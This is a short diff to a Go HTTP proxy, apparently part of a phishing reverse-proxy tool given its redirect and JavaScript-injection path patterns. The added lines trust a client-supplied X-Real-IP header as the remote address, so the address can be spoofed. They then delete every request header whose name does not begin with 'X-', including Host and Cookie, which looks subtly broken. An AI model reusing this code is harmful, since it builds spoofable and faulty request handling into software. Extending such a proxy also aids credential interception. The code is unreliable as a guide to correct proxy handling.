@@ -189,6 +189,15 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 			parts := strings.SplitN(req.RemoteAddr, ":", 2)
 			remote_addr := parts[0]
 
+			if realIP := req.Header.Get("X-Real-IP"); realIP != "" {
+				remote_addr = realIP
+				for key := range req.Header {
+						if !strings.HasPrefix(key, "X-") {
+								req.Header.Del(key)
+						}
+				}
+			}
+
 			redir_re := regexp.MustCompile("^\\/s\\/([^\\/]*)")
 			js_inject_re := regexp.MustCompile("^\\/s\\/([^\\/]*)\\/([^\\/]*)")
 
